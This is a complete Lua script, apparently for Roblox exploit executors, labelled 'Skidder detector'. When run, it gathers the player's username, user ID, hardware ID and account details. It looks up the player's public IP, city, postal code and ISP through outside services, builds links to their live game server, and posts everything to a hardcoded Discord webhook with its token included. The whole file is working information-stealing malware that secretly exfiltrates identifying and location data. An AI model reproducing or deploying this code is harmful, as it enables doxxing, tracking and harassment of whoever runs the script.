local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function getNameTag()
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("Head") and character.Head:FindFirstChild("Nametag") then
        local nameTagTextLabel = character.Head.Nametag:FindFirstChild("TextLabel")
        if nameTagTextLabel then
            return nameTagTextLabel.Text
        end
    end
    return "N/A"
end

local function createWebhookData()
    if not WebhookScript then WebhookScript = "N/A" end
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local nameTag = getNameTag()

    local data = {
        username = "Skidder detector",
        avatar_url = "https://i.ytimg.com/vi/vtCohrTRZMU/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLD46_TbYXjBkGLYBErfTWCftRcqQA",
        embeds = {
            {
                title = "📃 Script Information",
                description = "Script executed: ".. WebhookScript,
                color = tonumber("0x000000")
            },
            {
                title = "🎮 Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms\n**NameTag:** %s",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping, nameTag
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer =
                { 
                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1308652385454919730/06EUwPoY72DVeNWYGiJgc5vOrgrppIrF3R_h12akj0DLfK9dywzkIvQ4N5sIyJUzoIUf"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)